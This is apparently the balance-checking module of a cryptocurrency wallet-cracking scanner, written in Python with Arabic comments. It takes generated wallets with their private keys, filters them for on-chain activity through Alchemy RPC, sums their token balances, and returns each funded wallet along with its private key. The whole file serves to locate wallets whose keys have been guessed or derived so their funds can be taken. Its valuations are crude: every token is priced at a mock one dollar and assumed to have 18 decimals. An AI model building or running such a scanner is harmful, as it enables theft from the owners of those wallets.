# services/blockchain_checker.py (v2.4 - إصلاح نهائي لـ SyntaxError)

import asyncio
import httpx
from loguru import logger
from typing import List, Dict
from web3 import Web3, HTTPProvider
from core.models import GeneratedWallet
import sys

# --- الحل: تعريف حد أعلى منطقي لقيمة المحفظة باسم متغير صالح ---
LOGICAL_VALUE_LIMIT = 1e15  # 1 Quadrillion USD, a safe upper limit for any real wallet value

class BlockchainChecker:
    def __init__(self, settings_manager):
        self.settings_manager = settings_manager
        self.web3_providers: Dict[str, Web3] = {}
        self.active_networks: Dict = {}
        self._setup_providers()

    def _setup_providers(self):
        self.web3_providers.clear()
        self.active_networks.clear()
        api_key = self.settings_manager.get("api_keys.alchemy")
        if not api_key:
            logger.warning("Alchemy API key not found. Activity filter will be skipped.")
            return

        networks = self.settings_manager.get("networks")
        for name, info in networks.items():
            if info.get("enabled"):
                rpc_url = info["rpc_placeholder"].format(api_key=api_key) if "{api_key}" in info["rpc_placeholder"] else info["rpc_placeholder"]
                self.web3_providers[name] = Web3(HTTPProvider(rpc_url))
                self.active_networks[name] = info

    async def check_wallets_batch(self, wallets_batch: List[GeneratedWallet]) -> List[Dict]:
        self._setup_providers()

        active_wallets = await self._filter_for_activity(wallets_batch)
        if not active_wallets:
            return []

        logger.info(f"Found {len(active_wallets)} active wallets. Starting full balance check...")
        found_wallets = await self._check_balances_full(active_wallets)
        return found_wallets

    async def _filter_for_activity(self, wallets: List[GeneratedWallet]) -> List[GeneratedWallet]:
        w3_eth = self.web3_providers.get("Ethereum")
        if not w3_eth:
            logger.warning("Ethereum network not enabled. Skipping activity filter.")
            return wallets

        tasks = [asyncio.to_thread(self._get_tx_count, w3_eth, wallet) for wallet in wallets]
        results = await asyncio.gather(*tasks)
        return [res for res in results if res]

    def _get_tx_count(self, w3: Web3, wallet: GeneratedWallet) -> GeneratedWallet | None:
        try:
            tx_count = w3.eth.get_transaction_count(w3.to_checksum_address(wallet.address))
            if tx_count > 0:
                wallet.tx_count = tx_count
                return wallet
            return None
        except Exception:
            return None

    async def _check_balances_full(self, wallets: List[GeneratedWallet]) -> List[Dict]:
        mock_price = 1.0 
        min_balance = self.settings_manager.get("scanner.min_balance", 1.0)
        api_key = self.settings_manager.get("api_keys.alchemy")

        async with httpx.AsyncClient(timeout=20) as client:
            tasks = [self._check_single_wallet_balance(client, w, api_key, mock_price, min_balance) for w in wallets]
            results = await asyncio.gather(*tasks)
            return [res for res in results if res]

    async def _check_single_wallet_balance(self, client: httpx.AsyncClient, wallet: GeneratedWallet, api_key: str, price: float, min_balance: float) -> Dict | None:
        for name, info in self.active_networks.items():
            rpc_url = info["rpc_placeholder"].format(api_key=api_key) if "{api_key}" in info["rpc_placeholder"] else info["rpc_placeholder"]
            payload = {"jsonrpc": "2.0", "id": 1, "method": "alchemy_getTokenBalances", "params": [wallet.address, "erc20"]}

            try:
                response = await client.post(rpc_url, json=payload)
                if response.status_code != 200: continue

                data = response.json()
                token_balances = data.get("result", {}).get("tokenBalances", [])
                if not token_balances: continue

                total_usdt = 0.0
                tokens_details = []
                for token in token_balances:
                    try:
                        balance_hex = token.get("tokenBalance")
                        if balance_hex is None: continue

                        decimals = 18 
                        balance = int(balance_hex, 16) / (10 ** decimals)

                        if balance > 1e-9:
                            value = balance * price

                            if value < LOGICAL_VALUE_LIMIT and (total_usdt + value) < LOGICAL_VALUE_LIMIT:
                                total_usdt += value
                                tokens_details.append({"symbol": token["contractAddress"], "balance": balance, "value_usd": value})
                            else:
                                logger.warning(f"Ignored abnormally large token value for address {wallet.address}. Value: {value}")
                    except (ValueError, TypeError, OverflowError): continue

                if total_usdt >= min_balance:
                    num_tokens = len(tokens_details)
                    avg_token_value = total_usdt / num_tokens if num_tokens > 0 else 0.0
                    max_token_value = max(t['value_usd'] for t in tokens_details) if tokens_details else 0.0

                    return {
                        "address": wallet.address, "private_key": wallet.private_key,
                        "chain": name, "total_usdt": total_usdt, "tokens": tokens_details,
                        "strategy": wallet.strategy, "source": wallet.source,
                        "num_tokens": num_tokens,
                        "avg_token_value": avg_token_value,
                        "max_token_value": max_token_value,
                    }
            except Exception as e:
                logger.debug(f"Balance check failed for {wallet.address} on {name}: {e}")
        return None